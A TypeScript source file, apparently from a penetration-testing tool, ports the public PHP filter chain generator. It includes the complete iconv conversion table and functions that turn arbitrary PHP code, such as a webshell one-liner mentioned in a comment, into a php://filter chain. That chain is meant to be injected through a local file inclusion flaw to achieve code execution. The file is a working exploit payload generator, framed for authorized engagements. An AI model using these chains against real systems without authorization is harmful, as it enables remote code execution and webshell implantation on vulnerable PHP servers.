// Ported from synacktiv/php_filter_chain_generator
// https://github.com/synacktiv/php_filter_chain_generator (MIT license)
// Background: https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle
//
// Generation only: this builds the php://filter chain string for you to copy
// into an LFI parameter (or similar sink) that reads a php:// wrapped
// resource. BugEye never submits it anywhere. Verify the chain against a
// real PHP instance (a local Docker/CLI copy of the target's PHP version is
// safest) before relying on it in an authorized engagement: iconv charset
// behavior can vary slightly between PHP/iconv builds, exactly the reason
// the upstream tool ships a precomputed table instead of deriving one live.
//
// How it works: PHP's php://filter stream lets you chain convert.iconv.*
// character-set conversions. Each base64 alphabet character below maps to a
// specific, previously-verified sequence of iconv conversions that reliably
// produces that exact character as filter output. To build arbitrary text,
// the payload is base64-encoded, then one character's conversion chain is
// applied per iteration (processed in reverse order), each wrapped in a
// base64-decode/re-encode round trip to strip the escape characters iconv
// conversions introduce along the way, and the whole thing is decoded once
// at the end.

const FILE_TO_USE = 'php://temp';

const CONVERSIONS: Record<string, string> = {
  '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
  '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
  '2': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921',
  '3': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE',
  '4': 'convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE',
  '5': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2',
  '6': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2',
  '7': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4',
  '8': 'convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
  '9': 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB',
  A: 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
  a: 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
  B: 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000',
  b: 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
  C: 'convert.iconv.UTF8.CSISO2022KR',
  c: 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
  D: 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213',
  d: 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5',
  E: 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT',
  e: 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937',
  F: 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB',
  f: 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213',
  g: 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8',
  G: 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
  H: 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213',
  h: 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE',
  I: 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213',
  i: 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000',
  J: 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
  j: 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16',
  K: 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE',
  k: 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
  L: 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
  l: 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE',
  M: 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
  m: 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
  N: 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
  n: 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
  O: 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
  o: 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
  P: 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
  p: 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
  q: 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2',
  Q: 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
  R: 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
  r: 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101',
  S: 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
  s: 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
  T: 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103',
  t: 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS',
  U: 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943',
  u: 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
  V: 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB',
  v: 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2',
  W: 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936',
  w: 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
  X: 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932',
  x: 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS',
  Y: 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361',
  y: 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
  Z: 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16',
  z: 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937',
  '/': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4',
  '+': 'convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157',
  '=': '',
};

function toBase64Utf8(input: string): string {
  const bytes = new TextEncoder().encode(input);
  let binary = '';
  for (const b of bytes) binary += String.fromCharCode(b);
  return btoa(binary);
}

function generateFilterChain(base64Chain: string, debugBase64 = false): string {
  let filters = 'convert.iconv.UTF8.CSISO2022KR|';
  filters += 'convert.base64-encode|';
  filters += 'convert.iconv.UTF8.UTF7|';

  const reversed = base64Chain.split('').reverse();
  for (const c of reversed) {
    const conversion = CONVERSIONS[c];
    if (conversion === undefined) {
      throw new Error('Unsupported character in base64 chain: ' + JSON.stringify(c));
    }
    filters += conversion + '|';
    filters += 'convert.base64-decode|';
    filters += 'convert.base64-encode|';
    filters += 'convert.iconv.UTF8.UTF7|';
  }
  if (!debugBase64) filters += 'convert.base64-decode';

  return 'php://filter/' + filters + '/resource=' + FILE_TO_USE;
}

export interface PhpFilterChainResult {
  base64: string;
  chain: string;
}

// Primary mode: give it the PHP payload text you want the filter chain to
// ultimately produce, for example a webshell one-liner.
export function buildPhpFilterChainFromPayload(payload: string): PhpFilterChainResult {
  const base64 = toBase64Utf8(payload).replace(/=/g, '');
  return { base64, chain: generateFilterChain(base64) };
}

// Debug mode, mirroring the upstream tool's --rawbase64: give it a raw
// base64 string directly and get back a chain that leaves the result
// base64-encoded (not decoded), useful for testing one chain segment at a
// time against a real PHP instance instead of the final read/RCE payload.
export function buildPhpFilterChainFromBase64(rawBase64: string): PhpFilterChainResult {
  const base64 = rawBase64.replace(/=/g, '');
  if (!/^[A-Za-z0-9+/]*$/.test(base64)) {
    throw new Error('Not a valid base64 string.');
  }
  return { base64, chain: generateFilterChain(base64, true) };
}
